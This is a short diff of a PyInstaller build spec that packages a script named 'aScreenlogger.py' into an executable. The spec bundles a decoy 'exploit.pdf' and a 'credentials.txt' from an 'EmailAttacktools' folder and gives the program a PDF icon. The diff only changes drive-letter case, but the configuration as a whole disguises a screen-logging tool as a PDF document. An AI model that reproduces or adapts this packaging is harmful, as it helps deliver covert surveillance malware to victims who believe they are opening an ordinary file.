@@ -5,7 +5,7 @@ a = Analysis(
     ['aScreenlogger.py'],
     pathex=[],
     binaries=[],
-    datas=[('C:\\Users\\aktam\\Downloads\\exploit-0a0c007f04ad16f980fb020501d80004.exploit-server.net_exploit.pdf', '.'), ('d:\\EmailAttacktools\\credentials.txt', '.')],
+    datas=[('C:\\Users\\aktam\\Downloads\\exploit-0a0c007f04ad16f980fb020501d80004.exploit-server.net_exploit.pdf', '.'), ('D:\\EmailAttacktools\\credentials.txt', '.')],
     hiddenimports=[],
     hookspath=[],
     hooksconfig={},
@@ -35,5 +35,5 @@ exe = EXE(
     target_arch=None,
     codesign_identity=None,
     entitlements_file=None,
-    icon=['d:\\EmailAttacktools\\pdf.ico'],
+    icon=['D:\\EmailAttacktools\\pdf.ico'],
 )
